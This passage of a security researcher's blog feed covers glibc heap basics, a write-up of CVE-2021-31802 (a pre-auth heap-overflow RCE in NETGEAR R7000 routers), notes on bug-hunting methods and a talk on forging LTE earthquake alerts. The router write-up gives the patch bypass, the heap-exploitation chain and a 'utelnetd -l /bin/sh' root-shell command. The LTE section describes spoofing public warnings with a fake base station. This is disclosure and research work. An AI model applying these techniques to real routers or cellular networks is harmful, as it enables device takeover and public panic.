class="line"> Fastbins[idx=5, size=0x60] 0x00</span><br><span class="line"> Fastbins[idx=6, size=0x70] 0x00</span><br><span class="line"> ───────────────────── Unsorted Bin for arena &apos;main_arena&apos; ─────────────────────</span><br><span class="line"> [+] Found 0 chunks in unsorted bin.</span><br><span class="line"> ────────────────────── Small Bins for arena &apos;main_arena&apos; ──────────────────────</span><br><span class="line"> [+] Found 0 chunks in 0 small non-empty bins.</span><br><span class="line"> ────────────────────── Large Bins for arena &apos;main_arena&apos; ──────────────────────</span><br><span class="line"> [+] Found 0 chunks in 0 large non-empty bins.</span><br><span class="line"> gef➤  x/20g 0x7ffff7dd1b20</span><br><span class="line"> 0x7ffff7dd1b20 &lt;main_arena&gt;:  0x0 0x602000</span><br><span class="line"> 0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0 0x0</span><br><span class="line"> 0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0 0x0</span><br><span class="line"> 0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0 0x0</span><br><span class="line"> 0x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0 0x0</span><br><span class="line"> 0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0 0x602120</span><br><span class="line"> 0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0 0x7ffff7dd1b78</span><br><span class="line"> 0x7ffff7dd1b90 &lt;main_arena+112&gt;:  0x7ffff7dd1b78  0x7ffff7dd1b88</span><br><span class="line"> 0x7ffff7dd1ba0 &lt;main_arena+128&gt;:  0x7ffff7dd1b88  0x7ffff7dd1b98</span><br><span class="line"> 0x7ffff7dd1bb0 &lt;main_arena+144&gt;:  0x7ffff7dd1b98  0x7ffff7dd1ba8</span><br></pre></td></tr></table></figure></li></ol><h3 id="Consolidation"><a href="#Consolidation" class="headerlink" title="Consolidation"></a>Consolidation</h3><ol><li>由于多次的释放和malloc会不可避免的出现很多小的chunk，这就有可能有两个连续的chunk虽然都是空闲的，但是由于是两个独立的chunk，在malloc使用的时候并不能将他们作为一个chunk返回，因此就会降低内存的使用效率，为了减少碎片，就需要在合适的时候将这些相邻的空闲块给合并成一个大的chunk。</li><li>合并的函数就是malloc_consolidate, 调用它的时候就会对空闲块进行合并，那么这个函数的调用条件有什么呢<ol><li>malloc large bin的时候，当需要很大的chunk的时候，就会调用这个函数先进行一次合并，看看会不会多出来一些可以用的chunk。</li><li>当top chunk中的空间不够用的时候</li><li>free函数之后，会对chunk进行前后合并，如果这个合并后的chunk size大于FASTBIN_CONSOLIDATION_THRESHOLD，也会调用一次</li></ol></li></ol><h3 id="与堆利用相关的"><a href="#与堆利用相关的" class="headerlink" title="与堆利用相关的"></a>与堆利用相关的</h3><ol><li>我们前面先简单介绍了一下与堆相关的一些基本概念，虽然没有覆盖完全，但是与堆利用相关的已经基本列出，更加详细的认知需要在漏洞利用的过程中再去学习。</li><li>下面列出对漏洞利用的知识体系的基本框架<br><img src="/images/heap_exp/2021-05-18-11-49-04.png" alt></li><li>我们要想进行堆利用，就需要首先发现一个与堆相关的漏洞，UAF，堆溢出，double free这些，然后我们通过这个漏洞去修改一些chunk，这些chunk肯定是属于某个bin 链表或者tcache中，然后我们再借用house的各种方法去实现更复杂的利用方法。虽然还有很多方法没有列出，但是我们可以先掌握这些最基本的，这也是我在这个系列文章中要覆盖到的一些方法。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></li><li><a href="https://guyinatuxedo.github.io/25-heap/index.html?search=" target="_blank" rel="noopener">https://guyinatuxedo.github.io/25-heap/index.html?search=</a></li><li><a href="http://jcs.iie.ac.cn/ch/reader/create_pdf.aspx?file_no=20180101&amp;flag=1&amp;year_id=2018&amp;quarter_id=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/create_pdf.aspx?file_no=20180101&amp;flag=1&amp;year_id=2018&amp;quarter_id=1</a></li></ol><h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>本文作者为colorlight，首发于安全客 <a href="https://www.anquanke.com/post/id/241239" target="_blank" rel="noopener">https://www.anquanke.com/post/id/241239</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;堆利用系列之开篇&quot;&gt;&lt;a href=&quot;#堆利用系列之开篇&quot; class=&quot;headerlink&quot; title=&quot;堆利用系列之开篇&quot;&gt;&lt;/a&gt;堆利用系列之开篇&lt;/h2&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/categories/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="堆利用" scheme="https://colorlight.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-31802 NETGEAR R7000 httpd PreAuth RCE</title>
    <link href="https://colorlight.github.io/2021/04/27/CVE-2021-31802%20Netgear%20R7000%20preAuth%20RCE/"/>
    <id>https://colorlight.github.io/2021/04/27/CVE-2021-31802%20Netgear%20R7000%20preAuth%20RCE/</id>
    <published>2021-04-27T02:25:54.000Z</published>
    <updated>2021-06-17T14:14:38.200Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>CVE-2021-31802 is my first CVE assignment, Thanks @d4rkn3ss for his brilliant work. I learn a lot from his work.  Thanks @SecuriTeam_SSD for their professional work, they help me to get the CVE assignment within a month, which I never got a response from MITRE by myself.</p><h2 id="Vulnerability-Summary"><a href="#Vulnerability-Summary" class="headerlink" title="Vulnerability Summary"></a>Vulnerability Summary</h2><p>This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R7000 routers. Authentication is not required to exploit this vulnerability.<br>The vulnerability exists within the handling of http request, the issue results from the lack of proper validation of user-supplied data, which can result a heap overflow. An attacker can leverage this vulnerability to execute code with the root privilege.</p><h2 id="Affected-Systems"><a href="#Affected-Systems" class="headerlink" title="Affected Systems"></a>Affected Systems</h2><p>Netgear Nighthawk R7000 running firmware version 1.0.11.116 and before </p><h2 id="Vulnerability-Root-Cause-Analysis"><a href="#Vulnerability-Root-Cause-Analysis" class="headerlink" title="Vulnerability Root Cause Analysis"></a>Vulnerability Root Cause Analysis</h2><p>I bypass the patch for the ZDI-20-709 vulnerability, so I get this vulnerability. The patch for ZDI-20-709 cannot solve the root cause of the vulnerability. The httpd program allows user to upload a file with the url <code>/backup.cgi</code>. While the root cause of the vulnerability is that the program uses two variables to represent the length of the uploaded file.<br>One variable is related to the value of the <code>Content-length</code> in the http post request header, the other one is the length of the file content in the http post request body.</p><p>The vulnerability  exists in the <code>sub_16674</code>. Below picture is the heap overflow point:<br><img src="/images/netgear_r7000/2021-03-21-17-48-07.png"/><br>The decompiled code is like this:<br><img src="/images/netgear_r7000/2021-03-21-18-04-36.png"/>    </p><p>The program allocates memory for storing the file content by calling malloc，the return value is stored by <code>dword_1DE2F8</code>, the size is the value of <code>Content-Length</code> plus 600. The <code>Content-Length</code> value can be controlled by the attacker, thus if we provide a proper value, we can make the <code>malloc</code> to return any size of the heap chunk we want.</p><p>The <code>memcpy</code> function copies the http request payload from <code>s1</code>  to <code>dword_1DE2F8</code>, the copied buffer length is <code>v80 - v91</code> which is the length of the file content in the http post request body.</p><p>So this is the problem, the size of the heap-based buffer <code>dword_1DE2F8</code> can by controlled by the attacker with a small value, and the <code>v80-v91</code> can also by controlled with another larger value. Thus, it can cause a heap overflow.</p><h2 id="Exploit-Considerations"><a href="#Exploit-Considerations" class="headerlink" title="Exploit Considerations"></a>Exploit Considerations</h2><p>The patch for ZDI-20-709 is that it adds a check for one byte before <code>Content-Length</code>, it checks if it is a <code>&#39;\n&#39;</code>, I simply add a <code>&#39;\n&#39;</code> before the <code>Content-Length</code> in order to bypass the patch. Though the vulnerabilities are basically the same, but the exploit still needs a lot of efforts because the heap states are different between R6700 and R7000.</p><p>We may conduct a fastbin dup attack to the heap overflow vulnerability. But it is not easy to do this. Fastbin dup attack needs two continuous <code>malloc</code> function to get two return address from a same fastbin list, the first <code>malloc</code> returns the chunk whose <code>fd</code> pointer is overwritten by the heap overflow, the second <code>malloc</code> returns the address where we want to write data. </p><p>The bigest problem is that there should be no <code>free</code> procedure between these two <code>malloc</code> functions. But <code>dword_1DE2F8</code> is checked every time before malloc:<br><img src="/images/netgear_r7000/2021-03-21-21-11-46.png"/><br>If <code>dword_1DE2F8</code> is not a null pointer, it will be freed and set 0. Thus we should find another point of calling <code>malloc</code>.</p><p>Luckily, there is another <code>malloc</code> whose size can by controlled by us, it is in the function of  <code>sub_A5B68</code><br><img src="/images/netgear_r7000/2021-03-21-21-29-35.png"/><br>The function handles another file upload http request, we may use the <code>/genierestore.cgi</code> to trigger this function.</p><p>But there is another problem, both <code>/genierestore.cgi</code> and <code>/backup.cgi</code> requests can cause the <code>fopen</code> function gets called. The <code>fopen</code> function will call <code>malloc(0x60)</code> and <code>mallloc(0x1000)</code>. <code>malloc(0x1000)</code> will cause <code>__malloc_consolidate</code> function gets called which will destroy the fastbin, since the size is larger than the value of <code>max_fast</code>.</p><p>We need to find a way to change the <code>max_fast</code> value to a large value so that the <code>__malloc_consolidate</code> will not be triggered. According to the implemenation of uClibc <code>free</code> function:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> if ((unsigned long)(size) &lt;= (unsigned long)(av-&gt;max_fast)</span><br><span class="line"></span><br><span class="line">#if TRIM_FASTBINS</span><br><span class="line">    /* If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="line">       bordering top into fastbins */</span><br><span class="line">    &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">       ) &#123;</span><br><span class="line"></span><br><span class="line">set_fastchunks(av);</span><br><span class="line">fb = &amp;(av-&gt;fastbins[fastbin_index(size)]); // &lt;-------when size is set 8 bytes, the fastbin_index(size) is -1</span><br><span class="line">p-&gt;fd = *fb;</span><br><span class="line">*fb = p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>When we free a chunk whose size is 0x8, <code>fastbin_index(size)</code> return -1, and <code>av-&gt;fastbins[fastbin_index(size)]</code> will cause an out-of-bounds access.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state &#123;</span><br><span class="line">  /* The maximum chunk size to be eligible for fastbin */</span><br><span class="line">  size_t  max_fast;   /* low 2 bits used as flags */  </span><br><span class="line">  // 0</span><br><span class="line"></span><br><span class="line">  /* Fastbins */</span><br><span class="line">  // 4</span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><p>According to the struct of malloc_state, <code>fb = &amp;(av-&gt;fastbins[-1])</code> exactly points to <code>max_fast</code>, thus <code>*fb = p</code> will make the <code>max_fast</code> to a large value.<br>But in the normal situation, the chunk size cannot be 0x8 bytes, because it means that the user data is 0 byte. So we can first make use of the heap overflow vulnerability to overwrite the <code>PREV_INUSE</code> flag of a chunk so that it incorrectly indicates that the previous chunk is free. Due to the incorrect <code>PREV_INUSE</code> flag, we can get malloc() to return a chunk that overlaps an actual existing chunk. This lets us edit the size field in the existing chunk’s metadata, setting it to the invalid value of 8.  When this chunk is freed and placed on the fastbin, malloc_stats-&gt;max_fast is overwritten by a large value.Then the fopen will not lead to a <code>__malloc_consolidate</code>, so we can conduct a fastbin dup attack.<br>Once we make the <code>malloc</code> return a chosen address, we could overwrite the GOT entry of the <code>free</code> to the address of <code>system</code> PLT code. Finally we execute <code>utelnetd -l /bin/sh</code> to start the telnet service, then we get the root shell of R7000.</p><p>I use some techniques to make the exploit more steady. </p><ol><li><p>To make the malloc chunks are adjacent  so that the heap overflow will not corrupt other heap-based buffers, I send a very long payload to trigger closing the tcp connection in advance so that the <code>/backup.cgi</code> request will not calling <code>fopen</code> subsequently, and there will be no other malloc calling between two http requests. </p><img src="/images/netgear_r7000/2021-03-22-11-48-56.png"/>     </li><li><p>The httpd program’s heap state may be different when user login or logout the web management, to make the heap state consistent，I find that when I try to login the web management with wrong password for 3 times, the httpd program will redirect the user to a <code>Router Password Reset</code> page. I can make use of this feature to achieve a steady heap state.</p><img src="/images/netgear_r7000/2021-03-22-11-50-04.png"/>   </li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/">SSD Advisory – NETGEAR Nighthawk R7000 httpd PreAuth RCE</a></li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31802">CVE-2021-31802</a></li><li><a href="https://www.zerodayinitiative.com/blog/2020/6/24/zdi-20-709-heap-overflow-in-the-netgear-nighthawk-r6700-router">ZDI-20-709: HEAP OVERFLOW IN THE NETGEAR NIGHTHAWK R6700 ROUTER</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h2&gt;&lt;p&gt;CVE-2021-31802 is my first CVE assignment, Thanks @d4rkn3s</summary>
      
    
    
    
    <category term="IoT Security" scheme="https://colorlight.github.io/categories/IoT-Security/"/>
    
    
    <category term="IoT Security" scheme="https://colorlight.github.io/tags/IoT-Security/"/>
    
  </entry>
  
  <entry>
    <title>捉虫日记漏洞总结</title>
    <link href="https://colorlight.github.io/2020/10/10/%E6%8D%89%E8%99%AB%E6%97%A5%E8%AE%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://colorlight.github.io/2020/10/10/%E6%8D%89%E8%99%AB%E6%97%A5%E8%AE%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2020-10-10T08:44:18.000Z</published>
    <updated>2020-10-10T09:39:39.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近阅读了捉虫日记这本少有的讲述漏洞挖掘方法的书籍，本书虽然只有7个漏洞，但是对每个漏洞到底是如何发现的做了很详细的说明，还原了漏洞挖掘的思维过程，笔者认为这是本书最有价值的一块内容，现在大部分的文章都是讲述了漏洞原理但是对于漏洞是如何发现的内容涉及很少。漏洞的发现过程是比较琐碎的，甚至难以回忆，很容易忘记当时的发现的思路历程，所以比较难成文，笔者也将努力将原书中我比较喜欢的几个漏洞的ROOT CAUSE和如何找到做一些简单的总结。</p><h2 id="0x00-ESCAPE-FROM-WWW-ZONE漏洞"><a href="#0x00-ESCAPE-FROM-WWW-ZONE漏洞" class="headerlink" title="0x00 ESCAPE FROM WWW ZONE漏洞"></a>0x00 ESCAPE FROM WWW ZONE漏洞</h2><ul><li><p>ROOT CAUSE<br>由于有错误条件是两个方式共同表示的，返回值和一个参数值，当出现错误条件的时候，只设置了其中一个条件（返回值）忘记设置了参数，由于对同一个错误状态的两种表达方式不同步，最终导致这个oob</p></li><li><p>如何发现这个漏洞</p><ol><li>观察错误条件是否是两个因素或者多个因素决定的，对于这种编程范式就可以好好审计</li><li>构造好fuzz条件，fuzz 输入payload</li></ol></li></ul><h2 id="0x01-NULL-POINTER-FTW漏洞"><a href="#0x01-NULL-POINTER-FTW漏洞" class="headerlink" title="0x01 NULL POINTER FTW漏洞"></a>0x01 NULL POINTER FTW漏洞</h2><ul><li><p>ROOT CAUSE<br>由于对长度信息的处理不恰当，将一个unsigned 类型直接赋值给 有符号的变量，对这个长度信息所做的任何判断大小比较都会存在风险。</p></li><li><p>如何发现这漏洞<br>对于TLV格式的数据，定位抽取长度的变量，观察这个变量是否赋给了有符号的变量，不需要对所有的类型转换进行审计，只需要对这种标识长度的变量的类型转换进行审计就行。这种有符号的比较大小本身就是容易出问题，有符号的比较就要考虑到小于0的情况</p></li><li><p>漏洞利用<br>造成的是NULL pointer derefernce，但是这个并不是制造成了dos，还造成了控制ip，由于这个空指针应用的偏移是可控的，所以可以落到got表中，对got表的修改，即可以在紧接着的call 目标got表函数时造成劫持</p></li></ul><h2 id="0x02-ONE-KERNEL-TO-RULE-THEM-ALL-漏洞"><a href="#0x02-ONE-KERNEL-TO-RULE-THEM-ALL-漏洞" class="headerlink" title="0x02 ONE KERNEL TO RULE THEM ALL 漏洞"></a>0x02 ONE KERNEL TO RULE THEM ALL 漏洞</h2><ul><li>ROOT CAUSE<br>memcpy函数的第一个参数是任意可变的，即使n是固定值，直接实现了write what where</li><li>如何发现这个漏洞<ol><li>作者还是通过跟踪数据流向的方法在静态的审计函数的处理流程，重点关注了与长度相关的处理逻辑，但是这个漏洞不需要dst与n的不同步即可触发，或者可以理解为是不同步的一种特殊情况，由于dst是任意的，所以永远与n不同步。</li><li>除了仔细审计与长度相关的代码，还需要注意的是当涉及到与memcpy这种dst，src，和copy数目相关的函数的时候，一定要重点关注dst和num这两个值，要关注dst的来源是什么，是否和num同步，是否可能造成溢出，像这个漏洞是否dst是直接由用户指定的，这都是根据dst的来源而定的</li></ol></li></ul><h2 id="0x03-A-BUG-OLDER-THAN-4-4BSD-漏洞"><a href="#0x03-A-BUG-OLDER-THAN-4-4BSD-漏洞" class="headerlink" title="0x03 A BUG OLDER THAN 4.4BSD 漏洞"></a>0x03 A BUG OLDER THAN 4.4BSD 漏洞</h2><ul><li>ROOT CAUSE<br>从payload中转化的长度信息，赋值给了有符号数，对有符号的比较，比较绕过，导致越界的访问</li><li>如何发现这个漏洞<ol><li>在追踪数据流的时候，不仅对数据的长度信息关注，还需要对任何数目相关的字段关注，这些字段的比较大小是容易出错的</li><li>特别这些数目是有符号数的比较，是非常危险的，一定要注意小于0的情况是否是预期内的</li></ol></li></ul><h2 id="0x04-THE-RINGTONE-MASSACRE漏洞"><a href="#0x04-THE-RINGTONE-MASSACRE漏洞" class="headerlink" title="0x04 THE RINGTONE MASSACRE漏洞"></a>0x04 THE RINGTONE MASSACRE漏洞</h2><ul><li>Fuzz方法<br>变异策略<ul><li>通过对一个合法的文件格式进行逐个字节的0xff替换</li><li>这种变异策略是相对高效的，可以找到一些简单的有关长度的漏洞，而且不需要对格式协议有详细的了解，smb也可以尝试利用同样的方法进行一些测试。</li></ul></li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要是对书中几个漏洞的根因进行了提炼，对根因的理解抽象才能够举一反三，所以漏洞原因也尽量精简，笔者也在整理漏洞挖掘方法，但是由于分析的漏洞数量不够多，还不好拿出分享，等到分析足够多的漏洞，到时会以makdown map的形式展示出。<br>以后也会经常以本篇文章的形式分析一系列漏洞。</p><h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>本文作者为colorlight，转载请注明出处 <a href="https://colorlight.github.io">https://colorlight.github.io</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近阅读了捉虫日记这本少有的讲述漏洞挖掘方法的书籍，本书虽然只有7个漏洞，但是对每个漏洞到底是如何发现的做了很详细的说明，还原了漏洞挖掘的思</summary>
      
    
    
    
    <category term="漏洞挖掘方法" scheme="https://colorlight.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/"/>
    
    
    <category term="如何发现漏洞" scheme="https://colorlight.github.io/tags/%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="ROOT CAUSE" scheme="https://colorlight.github.io/tags/ROOT-CAUSE/"/>
    
    <category term="Fuzz 变异策略" scheme="https://colorlight.github.io/tags/Fuzz-%E5%8F%98%E5%BC%82%E7%AD%96%E7%95%A5/"/>
    
  </entry>
  
  <entry>
    <title>伪造LTE地震海啸警报</title>
    <link href="https://colorlight.github.io/2020/07/29/%E4%BC%AA%E9%80%A0LTE%E5%9C%B0%E9%9C%87%E6%B5%B7%E5%95%B8%E8%AD%A6%E6%8A%A5/"/>
    <id>https://colorlight.github.io/2020/07/29/%E4%BC%AA%E9%80%A0LTE%E5%9C%B0%E9%9C%87%E6%B5%B7%E5%95%B8%E8%AD%A6%E6%8A%A5/</id>
    <published>2020-07-29T11:54:54.000Z</published>
    <updated>2020-10-10T09:22:48.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我在2019年的HITB和DEFCON China的议题的解读，现在同步到我的blog上</p><h2 id="议题摘要"><a href="#议题摘要" class="headerlink" title="议题摘要"></a>议题摘要</h2><p>本议题将讨论LTE协议中与PWS(Public Warning System公共预警系统)相关的安全漏洞。 PWS是向公众播报地震海啸以及其他紧急事件的预警系统，在灾难发生前，PWS系统可以为人民的生命安全争取极其宝贵的时间。<br>我们仔细研究了LTE协议中与PWS相关部分，发现LTE空口中承载的预警信息是不经过加密以及完整性保护的，我们通过常用的软件无线电设备即可以仿造虚假的灾难预警信息，并且成功的迫使支持PWS的Android和iPhone手机发出灾难警报。通过对LTE协议中参数的精心配置，我们还实现了将灾难警报信息伪装成诈骗钓鱼以及广告短信的形式。最后我们提出了一些相应的解决办法，来防止PWS系统沦为摆设甚至成为电信诈骗的工具。</p><h2 id="议题解析"><a href="#议题解析" class="headerlink" title="议题解析"></a>议题解析</h2><p>3GPP协议中规定了4种公共警报系统，分别是日本的ETWS，美国的CMAS，韩国的KPAS以及欧洲的EU-Alert。由于各个国家的安全要求不同，因此标准化工作较为困难。为了避免系统复杂性，防止漫游到其他国家手机不能正常接收警报信息，目前的标准中并未加入对警报信息的签名等验证信息。<br><img src="/images/lte/clipboard1.png"><br><img src="/images/lte/clipboard2.png"><br>我们利用软件无线电设备USRP B210和开源的LTE测试平台srsLTE搭建LTE伪基站。为了不干扰正常用户的通信，我们的实验选择在了电磁屏蔽屋内进行。<br><img src="/images/lte/clipboard3.png"><br>为了能够使手机发起小区重选流程，我们搭建的伪基站的参数要尽量模仿合法基站的设置，可以利用一些常用的路测软件获取当前基站的参数，如TAC PCI以及下行频点号。<br><img src="/images/lte/clipboard4.png"><br>由于LTE的小区重选机制相对于GSM等系统较为严格，即使信号强度高于合法基站，仍然难以触发手机的小区重选，我们可以选在优先频点或者将物理小区号设置成与合法基站相同的以增加接入成功率。<br><img src="/images/lte/clipboard5.png"><br>为了避免手机发起鉴权流程，要将TAC设置成与合法基站一样的，手机无法发起位置区更新，则不会对伪基站的合法性进行甄别。<br><img src="/images/lte/clipboard6.png"><br>LTE协议中直接携带警报信息内容的是系统广播信息System information，其中SIB 10携带的是日本的ETWS的第一级警报信息，此信息仅包含固定的警报消息类型，如地震海啸或者其他紧急警报。SIB 11中携带的是ETWS的第二级警报信息，包含具体的警报内容，如地震中心，地震强度等，此信息是自定义的。SIB 12是携带的CMAS KPAS和EU-ALERT警报消息。<br>由于ETWS相较于其他系统分为两个等级的警报信息，较为复杂，我们以ETWS为例进行伪造警报消息。<br><img src="/images/lte/clipboard7.png"><br>除了SIB10 SIB11直接携带警报消息外，SIB 1负责对SIB10以及SIB11的调度，paging消息负责向用户手机提示有警报消息需要接收。<br><img src="/images/lte/clipboard8.png"><br>由于srsLTE中没有针对SIB10的定义与实现，我们需要比照协议对SIB10进行构造，其中messageIdentifer字段标识了消息类型，地震警报需要将此值设置为0x1102。其他参数的具体配置可以参看截图。<br><img src="/images/lte/clipboard9.png"><br>我们需要在srsLTE源码中添加对paging消息的修改，使paging消息中增加对ETWS警报信息的指示。<br><img src="/images/lte/clipboard10.png"><br>其实我们不仅可以利用ETWS消息发送地震警报，我们甚至可以它改造成一个广告诈骗等垃圾短信。将message identifier字段设置为0x1104就可以使手机不发出警报声，但是仍弹出信息内容。<br><img src="/images/lte/clipboard11.png"><br>以上是我们在Google Pixel手机上分别伪造的地震警报信息和添加了钓鱼电话的诈骗信息。<br><img src="/images/lte/clipboard12.png"><br>由于中国没有在手机移动网络中支持公共报警服务，因此国内版的Android手机并不会对伪造的警报信息作出响应，同时国行版的苹果手机也仅在MCC为001,MNC为01的测试网络中对警报信息作出响应。<br><img src="/images/lte/clipboard13.png"><br>公共警报信息的不加密造成的潜在安全威胁还是较大的，如果在人口密集处如满座的球场内发送警报信息有可能导致踩踏事件。2018年的夏威夷导弹误警报就是基于美国的PWS系统CMAS传播的，这导致了全城的恐慌和社会混乱。<br><img src="/images/lte/clipboard14.png"><br>目前可以利用非对称加密的机制对警报信息添加签名信息来防止恶意伪造的虚假警报。<br><img src="/images/lte/clipboard15.png"><br>由于各国对警报消息的要求不同，3GPP的警报的标准化进行较为困难，导致数字签名验证机制并没有作为一种强制执行要求，所以现在的手机均是不验证警报消息的合法性的。</p><h2 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h2><iframe width="640" height="360" src="https://www.youtube.com/embed/B1RVA01g3Bg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://conference.hitb.org/hitbsecconf2019ams/sessions/haxpo-this-is-a-public-service-announcement-hacking-lte-public-warning-systems/" target="_blank" rel="noopener">HAXPO: This is a Public Service Announcement: Hacking LTE Public Warning Systems</a></li><li><a href="https://www.defcon.org/html/dc-china-1/dc-cn-1-speakers.html" target="_blank" rel="noopener">WARNING: Magnitude 10 Earthquake Is Coming in One Minute</a></li><li><a href="https://www.anquanke.com/post/id/177963" target="_blank" rel="noopener">安全客|HITB议题解读 | 伪造LTE地震海啸警信息</a></li><li><a href="https://conference.hitb.org/hitbsecconf2019ams/materials/HAXPO%20D1%20-%20Hacking%20LTE%20Public%20Warning%20Systems%20-%20Weiguang%20Li.pdf" target="_blank" rel="noopener">HAXPO D1 - Hacking LTE Public Warning Systems - Weiguang Li.pdf</a></li></ul><h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>本文作者为colorlight，首发于安全客<br>转载请注明出处 <a href="https://colorlight.github.io/2020/07/29/伪造LTE地震海啸警报/">https://colorlight.github.io/2020/07/29/伪造LTE地震海啸警报/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这是我在2019年的HITB和DEFCON China的议题的解读，现在同步到我的blog上&lt;/p&gt;
&lt;h2 id=&quot;议题摘要&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="LTE security" scheme="https://colorlight.github.io/categories/LTE-security/"/>
    
    
    <category term="PWS" scheme="https://colorlight.github.io/tags/PWS/"/>
    
    <category term="LTE安全" scheme="https://colorlight.github.io/tags/LTE%E5%AE%89%E5%85%A8/"/>
    
    <category term="伪造地震消息" scheme="https://colorlight.github.io/tags/%E4%BC%AA%E9%80%A0%E5%9C%B0%E9%9C%87%E6%B6%88%E6%81%AF/"/>
    
  </entry>
  
</feed>
